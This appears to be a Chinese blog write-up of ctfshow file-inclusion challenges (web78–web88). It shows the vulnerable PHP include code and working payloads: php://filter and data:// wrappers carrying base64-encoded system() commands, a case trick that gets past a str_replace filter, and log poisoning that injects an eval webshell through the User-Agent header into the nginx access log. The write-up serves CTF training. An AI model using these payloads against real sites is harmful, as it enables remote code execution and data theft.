<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【ctfshow】文件包含练习2 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【ctfshow】文件包含练习2" />
<meta property="og:description" content="目录
web78
解法一
解法二
web79
解法一
解法二
web80
web81
web88
web78 &lt;?php if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; include($file); }else{ highlight_file(__FILE__); } 解法一 用include包含
/?file=php://filter/read=convert.base64-encode/resource=flag.php
解法二 php://input &#43; POST web79 &lt;?php if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $file = str_replace(&#34;php&#34;, &#34;???&#34;, $file); include($file); }else{ highlight_file(__FILE__); } 解法一 str_replace() 函数替换字符串中的一些字符（区分大小写） 解法二 str_replace:将php替换成？？？，因此php伪协议不能用了，换成data协议
data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw== &lt;?php system(&#39;ls&#39;);	?&gt;#flag.php index.php data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= &lt;?php system(&#39;cat flag.php&#39;); ?&gt; web80 if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $file = str_replace(&#34;php&#34;, &#34;???&#34;, $file); $file = str_replace(&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/e6c03b170dbf1cd4b8752da9eadf3291/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-11T08:22:29+08:00" />
<meta property="article:modified_time" content="2022-02-11T08:22:29+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【ctfshow】文件包含练习2</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="-toc" style="margin-left:40px;"></p> 
<p id="web78-toc" style="margin-left:40px;"><a href="#web78" rel="nofollow">web78</a></p> 
<p id="%E8%A7%A3%E6%B3%95%E4%B8%80-toc" style="margin-left:80px;"><a href="#%E8%A7%A3%E6%B3%95%E4%B8%80" rel="nofollow">解法一</a></p> 
<p id="%E8%A7%A3%E6%B3%95%E4%BA%8C-toc" style="margin-left:80px;"><a href="#%E8%A7%A3%E6%B3%95%E4%BA%8C" rel="nofollow">解法二</a></p> 
<p id="web79-toc" style="margin-left:40px;"><a href="#web79" rel="nofollow">web79</a></p> 
<p id="%E8%A7%A3%E6%B3%95%E4%B8%80-toc" style="margin-left:80px;"><a href="#%E8%A7%A3%E6%B3%95%E4%B8%80" rel="nofollow">解法一</a></p> 
<p id="%C2%A0%E8%A7%A3%E6%B3%95%E4%BA%8C-toc" style="margin-left:80px;"><a href="#%C2%A0%E8%A7%A3%E6%B3%95%E4%BA%8C" rel="nofollow"> 解法二</a></p> 
<p id="%C2%A0web80-toc" style="margin-left:40px;"><a href="#%C2%A0web80" rel="nofollow"> web80</a></p> 
<p id="%C2%A0web81-toc" style="margin-left:40px;"><a href="#%C2%A0web81" rel="nofollow"> web81</a></p> 
<p id="web88-toc" style="margin-left:40px;"><a href="#web88" rel="nofollow">web88</a></p> 
<hr id="hr-toc"> 
<h3 id="web78">web78</h3> 
<pre><code class="language-php">&lt;?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
</code></pre> 
<h4 id="%E8%A7%A3%E6%B3%95%E4%B8%80">解法一</h4> 
<p>用include包含</p> 
<blockquote> 
 <p>/?file=php://filter/read=convert.base64-encode/resource=flag.php</p> 
</blockquote> 
<h4 id="%E8%A7%A3%E6%B3%95%E4%BA%8C">解法二</h4> 
<blockquote> 
 <h4 id="php%3A%2F%2Finput%20%2B%20POST">php://input + POST</h4> 
</blockquote> 
<p> <img alt="" height="570" src="https://images2.imgbox.com/cf/55/yH94vSd6_o.png" width="1002"></p> 
<p><img alt="" height="684" src="https://images2.imgbox.com/e7/c6/5RvEUs3t_o.png" width="1067"> </p> 
<h3 id="web79">web79</h3> 
<pre><code class="language-php">&lt;?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}</code></pre> 
<h4>解法一</h4> 
<blockquote> 
 <p>str_replace() 函数替换字符串中的一些字符（区分大小写） </p> 
</blockquote> 
<p><img alt="" height="755" src="https://images2.imgbox.com/54/c8/jwyequME_o.png" width="1101"> </p> 
<p> </p> 
<h4 id="%C2%A0%E8%A7%A3%E6%B3%95%E4%BA%8C"> 解法二</h4> 
<p>str_replace:将php替换成？？？，因此php伪协议不能用了，换成data协议</p> 
<p><img alt="" height="237" src="https://images2.imgbox.com/0c/fc/nz5JNDPI_o.png" width="1200"></p> 
<p> <img alt="" height="396" src="https://images2.imgbox.com/34/84/CplvjvbF_o.png" width="1200"></p> 
<p> </p> 
<h3></h3> 
<pre><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==
&lt;?php system('ls');	?&gt;#flag.php index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
&lt;?php system('cat flag.php'); ?&gt;</code></pre> 
<h3 id="%C2%A0web80"> web80</h3> 
<pre><code class="language-php">if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
</code></pre> 
<p>大小写绕过str_replace()<br> open_basedir对system等函数无效 </p> 
<p><img alt="" height="340" src="https://images2.imgbox.com/10/c5/AdPE4U4K_o.png" width="743"></p> 
<p><img alt="" height="480" src="https://images2.imgbox.com/5d/3f/aa3bpEzL_o.png" width="1036"> </p> 
<h3 id="%C2%A0web81"> web81</h3> 
<p>看提示</p> 
<p><img alt="" height="195" src="https://images2.imgbox.com/99/4e/IGDDLrDY_o.png" width="614"></p> 
<pre><code class="language-php">if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}</code></pre> 
<p>连：都被过滤了。用日志getshell</p> 
<pre><code>日志文件include
原理:对网站进行访问时,日志文件会记录相关信息(请求头中的信息)
前提:知道日志文件所在,并能进行包含
步骤:
先访问网站在请求头中写入一句话(一般写在user-agent中)
然后通过post去尝试执行
执行成功后通过蚁剑连接得到shell</code></pre> 
<p> </p> 
<blockquote> 
 <p><strong>UA头命令执行，日志文件包含getshell</strong><br> 日志文件的路径：<code>/var/log/nginx/access.log</code><br> User-Agent头构造代码:<code>&lt;?php @eval($_POST['chopper']); ?&gt;</code></p> 
</blockquote> 
<p><img alt="" height="369" src="https://images2.imgbox.com/51/dc/o3Xprhcl_o.png" width="961"> </p> 
<p><img alt="" height="697" src="https://images2.imgbox.com/e8/f9/7gRCUDxi_o.png" width="1075"> </p> 
<p>从目录里面找到flag</p> 
<h3 id="web88">web88</h3> 
<pre><code class="language-php">&lt;?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}</code></pre> 
<p> 没有过滤：/  可以用data协议，但要注意的是过滤了= 删去即可</p> 
<pre><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw
&lt;?php system('ls');	?&gt;#flag.php index.php
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4
&lt;?php system('cat fl0g.php'); ?&gt;</code></pre> 
<p></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/86257a3c3b9f5d52ac98e5aac1b9b072/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Linux 面试宝典</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/432f3e2699976f84e7e56562bea952a6/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">将png/jpg图像数据集转四维tensor输入PyTorch</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>